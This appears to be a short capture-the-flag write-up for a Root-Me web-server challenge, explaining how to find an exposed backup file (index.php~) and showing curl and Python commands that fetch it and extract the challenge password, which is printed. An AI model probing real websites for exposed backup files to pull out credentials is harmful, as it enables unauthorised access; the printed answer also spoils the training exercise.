@@ -1,0 +1,23 @@
+WebServer Challenge 11 - BackupFile
+
+Synopsis:
+Find the backup file to gain access.
+
+Common backup file formats could be:
+
+index.old
+index.bak
+index.php.old
+index.php~
+
+etc..
+
+index.php~ was the backup file in question.
+
+You could simply curl http://challenge01.root-me.org/web-serveur/ch11/index.php~
+
+OR using python.. :D
+
+>>> r = requests.get('http://challenge01.root-me.org/web-serveur/ch11/index.php~')
+>>> re.findall('password=\"*.*\w',r.content)
+['password="OCCY9AcNm1tj']
